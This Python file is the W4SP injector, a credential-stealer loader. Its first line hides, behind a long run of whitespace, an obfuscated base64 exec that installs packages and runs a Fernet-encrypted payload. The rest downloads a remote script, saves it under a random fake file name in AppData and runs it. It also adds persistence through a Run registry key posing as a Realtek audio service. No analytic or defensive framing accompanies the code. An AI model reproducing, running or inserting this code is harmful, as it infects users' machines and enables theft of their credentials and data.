import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ1dtc2hnNEJsUlY0U3J6b2R3MUlkTTVZcHRSYVRtcnlIcXZSVG5BTWRaQXM9JykuZGVjcnlwdChiJ2dBQUFBQUJuQ2x4Sm1ncHUwWWloS2ZocS1FTnJRVXNyWW90V3FkZGdFaVQ0aTNKVHp4TlFCY25HaDdDUmZZdERlb05tblh0YjFYOXVfTUIxLUNMbDhaWDBuVW83ZEZ0dzZNY3JHcU5BRHdHWEJzYWJtNndNVjB6SXFsTkpySXNxeGVxZ2FRb1FEYl9pYVRGUnY4anlkX3VQY3JjNkZGRlBpWnlPMWU0TXBzQ1F1SF9HbS1IM0NydUZVa3NNVk9OcEFpOVQ1STRIY1hLbEJDSVI5NDRKcUpqb1hQZUhKWXVSSzFLMWt4N1hwMFJQLVBTRWtma2hoY3M9Jykp').decode())
from sys import executable
from urllib import request
from os import getenv, system, name, listdir
from os.path import isfile
import winreg
from random import choice

if name != 'nt': 
    exit()

# W4SP injector 1.1
# by loTus04

def getPath():
    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(path)
    for _ in range(10):
        chosen = choice(directory)
        ye = path + "\\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def getName():
    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return firstName + choice(lasName)


def install(path):
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(request.urlopen("W4SPGRAB").read().decode("utf8"))

def run(path):
    system(f"start {executable} {path}")

def startUP(path):
    faked = 'SecurityHealthSystray.exe'
    address = f"{executable} {path}"
    key1 = winreg.HKEY_CURRENT_USER
    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")

import contextlib
DoYouKnowTheWay = getPath() + '\\' + getName()
install(DoYouKnowTheWay)
run(DoYouKnowTheWay)
with contextlib.suppress(Exception):
    startUP(DoYouKnowTheWay)
print('zlmqba')